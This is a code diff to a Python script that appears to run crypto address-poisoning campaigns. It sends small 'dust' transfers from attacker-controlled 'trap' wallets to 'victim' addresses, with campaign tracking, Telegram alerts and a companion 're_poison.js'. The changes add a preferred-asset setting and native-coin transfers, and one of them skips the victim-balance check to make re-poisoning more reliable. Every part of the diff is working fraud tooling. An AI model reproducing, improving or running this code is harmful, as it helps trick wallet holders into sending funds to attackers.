@@ -47,6 +47,13 @@ supabase = None
 if SUPABASE_URL and SUPABASE_KEY and create_client:
     supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
 
+# ─── Read preferred asset from environment (set by re_poison.js) ───
+PREFERRED_ASSET = os.getenv("DUST_ASSET")
+if PREFERRED_ASSET:
+    print(f'[DEBUG] PREFERRED_ASSET from env: {PREFERRED_ASSET}')
+else:
+    print('[DEBUG] No PREFERRED_ASSET set, will use default fallback')
+
 def update_job(job_id, status=None, progress=None, total=None, message=None):
     """Update job status in Supabase with proper ISO timestamps."""
     if not supabase or not job_id:
@@ -281,7 +288,8 @@ def get_token_balance(address, token_symbol):
         logger.warning(f"Failed to get token balance for {address}: {e}")
         return 0
 
-def choose_asset(victim, trap):
+# ─── Modified choose_asset with preferred asset support ───
+def choose_asset(victim, trap, preferred_asset=None):
     victim_usdc = get_token_balance(victim, "USDC")
     trap_usdc = get_token_balance(trap, "USDC")
     victim_usdc_native = get_token_balance(victim, "USDC_NATIVE")
@@ -290,14 +298,42 @@ def choose_asset(victim, trap):
     victim_usdt = get_token_balance(victim, "USDT")
     trap_usdt = get_token_balance(trap, "USDT")
     
+    # Fetch native balances for preferred asset logic
+    trap_native_bal = call_with_retry(w3.eth.get_balance, trap)
+    victim_native_bal = call_with_retry(w3.eth.get_balance, victim)
+    
     force_stable = os.getenv("FORCE_STABLECOIN_DUST", "").lower() == "true"
 
     print(f"\n[DEBUG] === BALANCE CHECK ===")
+    print(f"[DEBUG] Trap Native: {trap_native_bal} | Victim Native: {victim_native_bal}")
     print(f"[DEBUG] Trap USDC: {trap_usdc} | Victim USDC: {victim_usdc}")
     print(f"[DEBUG] Trap USDT: {trap_usdt} | Victim USDT: {victim_usdt}")
     print(f"[DEBUG] DUST_AMOUNT config: {DUST_AMOUNT}")
     print(f"[DEBUG] FORCE_STABLECOIN_DUST: {force_stable}")
+    print(f"[DEBUG] PREFERRED_ASSET: {preferred_asset}")
 
+    # 1. If a preferred asset is specified (from re_poison.js), try to use it first
+    if preferred_asset:
+        asset_key = preferred_asset.upper()
+        if asset_key in DUST_AMOUNT:
+            dust_amount = DUST_AMOUNT[asset_key]
+            
+            # Check if trap has enough of this asset
+            has_balance = False
+            if asset_key == NATIVE_SYMBOL:
+                has_balance = trap_native_bal >= dust_amount
+            else:
+                token_balance = get_token_balance(trap, asset_key)
+                has_balance = token_balance >= dust_amount
+            
+            # If trap has it, use it (bypass victim balance check for re-poison reliability)
+            if has_balance:
+                print(f"[DEBUG] ✅ Selected PREFERRED_ASSET: {asset_key}")
+                return (asset_key, dust_amount)
+        else:
+            print(f"[DEBUG] ⚠️ PREFERRED_ASSET {asset_key} not in DUST_AMOUNT config. Falling back.")
+
+    # 2. Original fallback logic (USDC / USDT)
     if "USDC" in DUST_AMOUNT:
         dust_amount = DUST_AMOUNT["USDC"]
         if trap_usdc_native >= dust_amount and (victim_usdc_native > 0 or force_stable):
@@ -323,6 +359,7 @@ def choose_asset(victim, trap):
 _last_low_balance_alert = {}
 _local_nonces = {}
 
+# ─── Modified send_dust to support native transfers ───
 def send_dust(private_key, victim_address, campaign_id=None):
     try:
         victim = w3.to_checksum_address(victim_address)
@@ -330,7 +367,9 @@ def send_dust(private_key, victim_address, campaign_id=None):
         trap = account.address
         logger.info(f"Trap: {trap} -> Victim: {victim}")
 
-        asset, dust = choose_asset(victim, trap)
+        # Pass preferred_asset from environment to choose_asset
+        preferred_from_env = os.getenv("DUST_ASSET")
+        asset, dust = choose_asset(victim, trap, preferred_from_env)
         if asset is None:
             msg = f"❌ No suitable stablecoin found to send dust from trap {trap} to victim {victim}."
             logger.warning(msg)
@@ -385,39 +424,54 @@ def send_dust(private_key, victim_address, campaign_id=None):
 
         chain_id = w3.eth.chain_id
 
-        token_addr = TOKEN_CONFIG.get(asset)
-        if not token_addr:
-            logger.error(f"Unknown token {asset}")
-            return False
+        # ─── BUILD TRANSACTION (Supports BOTH Native and ERC-20) ───
+        if asset == NATIVE_SYMBOL:
+            # Native transfer logic
+            tx_payload = {
+                "from": trap,
+                "to": victim,
+                "value": dust,
+                "nonce": nonce,
+                "chainId": chain_id,
+                "gas": 21000,  # Native transfers always use 21000 gas
+                **gas_params
+            }
+            tx = tx_payload
+            required_eth = (21000 * effective_gas_price) + dust
+        else:
+            # ERC-20 transfer logic (existing)
+            token_addr = TOKEN_CONFIG.get(asset)
+            if not token_addr:
+                logger.error(f"Unknown token {asset}")
+                return False
+                
+            token = w3.eth.contract(address=w3.to_checksum_address(token_addr), abi=ERC20_ABI)
+            token_balance = call_with_retry(token.functions.balanceOf, trap).call()
             
-        token = w3.eth.contract(address=w3.to_checksum_address(token_addr), abi=ERC20_ABI)
-        token_balance = call_with_retry(token.functions.balanceOf, trap).call()
-        
-        if token_balance < dust:
-            msg = f"⚠️ Insufficient {asset} balance in trap {trap} for victim {victim}. Need {dust}, have {token_balance}. Aborting."
-            logger.warning(msg)
-            send_telegram(msg, campaign_id=campaign_id)
-            return False
+            if token_balance < dust:
+                msg = f"⚠️ Insufficient {asset} balance in trap {trap} for victim {victim}. Need {dust}, have {token_balance}. Aborting."
+                logger.warning(msg)
+                send_telegram(msg, campaign_id=campaign_id)
+                return False
 
-        # --- SAFE & OPTIMIZED GAS ESTIMATION ---
-        try:
-            estimated = call_with_retry(token.functions.transfer(victim, dust).estimate_gas, {'from': trap})
-            gas_limit = int(estimated * 1.05)
-        except Exception as e:
-            logger.warning(f"Gas estimation failed: {e}, using fallback 68000")
-            gas_limit = 68000
+            try:
+                estimated = call_with_retry(token.functions.transfer(victim, dust).estimate_gas, {'from': trap})
+                gas_limit = int(estimated * 1.05)
+            except Exception as e:
+                logger.warning(f"Gas estimation failed: {e}, using fallback 68000")
+                gas_limit = 68000
 
-        tx_payload = {
-            "from": trap,
-            "nonce": nonce,
-            "chainId": chain_id,
-            "gas": gas_limit,
-            **gas_params
-        }
+            tx_payload = {
+                "from": trap,
+                "nonce": nonce,
+                "chainId": chain_id,
+                "gas": gas_limit,
+                **gas_params
+            }
+            tx = token.functions.transfer(victim, dust).build_transaction(tx_payload)
+            required_eth = gas_limit * effective_gas_price
 
-        tx = token.functions.transfer(victim, dust).build_transaction(tx_payload)
-        required_eth = gas_limit * effective_gas_price
-
+        # --- Final balance check before broadcast ---
         native_balance = call_with_retry(w3.eth.get_balance, trap)
 
         MIN_RESERVE_NATIVE = float(os.getenv("MIN_RESERVE_NATIVE", "0.0001"))
